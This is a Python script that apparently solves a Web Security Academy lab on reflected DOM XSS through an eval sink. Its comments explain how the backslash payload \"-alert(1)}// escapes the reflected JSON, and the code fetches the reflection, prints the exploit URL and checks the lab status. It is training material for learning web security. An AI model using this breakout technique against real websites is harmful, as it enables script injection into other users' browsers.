import argparse
import requests

# Reflected DOM XSS. The search term is reflected into a JSON response from
# /search-results, and searchResults.js runs eval('(' + this.responseText + ')').
# The server escapes " to \" but not backslashes, so \"-alert(1)}// supplies a
# backslash that eats the escape, closes the JSON string, executes alert(1), closes
# the object, and comments out the rest.
#
# The eval runs in the browser, so Python can't fire the alert. The script fetches
# the /search-results JSON to show the breakout is reflected, prints the exploit
# URL, and checks the lab status.

parser = argparse.ArgumentParser(description="Solve XSS lab 12 (Reflected DOM XSS via eval)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default='\\"-alert(1)}//',
                    help="JSON-string breakout payload for the eval sink")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# show how the payload lands in the JSON that gets passed to eval
j = requests.get(lab_url + "/search-results", params={"search": args.payload})
print("[*] /search-results JSON (fed to eval in the browser):")
print("    " + j.text.strip()[:200])

exploit_url = f"{lab_url}/?search={requests.utils.quote(args.payload)}"
print("[*] Reflected DOM XSS - the eval runs in the browser. Open this URL:")
print(f"    {exploit_url}")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the exploit URL above in a browser.")
